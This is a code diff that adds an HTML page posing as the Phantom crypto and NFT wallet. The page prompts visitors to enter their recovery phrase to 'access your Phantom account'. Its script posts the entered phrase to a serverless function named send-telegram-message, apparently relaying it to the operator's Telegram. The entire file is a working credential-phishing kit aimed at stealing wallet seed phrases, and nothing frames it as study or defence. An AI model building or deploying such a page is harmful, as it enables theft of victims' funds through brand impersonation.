@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Phantom — Crypto & NFT Wallet</title>
+  <meta name="description" content="Your trusted companion for NFTs & DeFi on Solana, Ethereum, & Polygon">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body class="bg-[#f5f2ff] h-screen">
+  <div class="container p-5 flex">
+    <a href="index.html">
+      <img class="w-36" src="logo.svg" alt="logo">
+    </a>
+  </div>
+  <form id="telegramForm">
+    <div id="app">
+        <div class="p-5 mt-10 flex flex-col items-center justify-center">
+          <textarea name="name" id="message" class="p-2 w-full lg:w-6/12 rounded min-h-36 border border-2 border-[#ab9ff2]"></textarea>
+          <div class="text-sm text-[#aa99ec] mt-3">
+            Enter your Phrase to access your Phantom account.<br />
+          </div>
+          <button type="submit" class="px-2 py-1 w-40 rounded-lg mt-5 h-12 bg-violet-200 text-white" style="background-color: #AB9FF2;">
+            Continue
+          </button>
+        </div>
+    </div>
+  </form>
+
+  <script>
+    document.getElementById('telegramForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const message = document.getElementById('message').value;
+
+        // Send the message to your server (Netlify function)
+        fetch('/.netlify/functions/send-telegram-message', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: message })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('Message sent successfully!');
+                window.location.href = 'index.html';
+            } else {
+                alert('Error sending message.');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
+  </script>
+
+</body>
+</html>
